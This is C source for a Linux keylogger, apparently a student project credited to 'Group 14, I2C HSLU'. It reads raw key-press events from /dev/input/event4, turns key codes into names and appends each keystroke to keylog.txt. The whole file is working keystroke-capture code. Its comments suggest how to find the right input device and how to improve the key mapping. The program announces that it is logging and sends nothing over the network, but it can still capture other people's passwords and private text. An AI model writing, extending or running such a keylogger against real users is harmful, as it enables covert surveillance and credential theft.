/*
 * Author: Group 14, I2C HSLU
*/

// Necessary includes from standard C libraries
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>

// Constants
#define KEYBOARD_DEVICE "/dev/input/event4" // Replace the event the actual event number for your keyboard (see /dev/input/by-path)...
// ^ better possibility??
// grep -iA6 keyboard /proc/bus/input/devices | grep Sysfs | grep input
#define LOG_FILE_PATH "keylog.txt"

/*
 * Log keys
*/
void log_key(const char *filename, const char *key) {
    FILE *file = fopen(filename, "a");
    if (file == NULL) {
        perror("Error opening log file");
        exit(EXIT_FAILURE);
    }
    fprintf(file, "%s\n", key);
    fclose(file);
}

/*
 * Static mapping of key codes to human readable
 * ... should be chnaged to a dynamic method, like libevdev...
*/
const char* get_key_name(int key_code) {
    static const char *key_names[] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", 
        "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE",
        "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M",
        "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE",
        "CAPSLOCK", /* and so on for other keys... */
    };

    if (key_code >= 0 && key_code < sizeof(key_names) / sizeof(key_names[0])) {
        return key_names[key_code];
    } else {
        return "UNKNOWN";
    }
}

/*
 * MAIN PROCEDURE
*/
int main() {
    struct input_event ev;
    int fd;

    // Open the keyboard device
    fd = open(KEYBOARD_DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Error opening input device");
        return EXIT_FAILURE;
    }

    printf("Logging keystrokes to %s\n", LOG_FILE_PATH);

    // loop
    while (1) {
	// reading keystrokes
        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
            perror("Error reading input event");
            break;
        }
	
	// Key mapping and logging
        if (ev.type == EV_KEY && ev.value == 1) { // Key press
            const char *key_name = get_key_name(ev.code);
            log_key(LOG_FILE_PATH, key_name);
        }
    }

    // Close device
    close(fd);
    return 0;
}
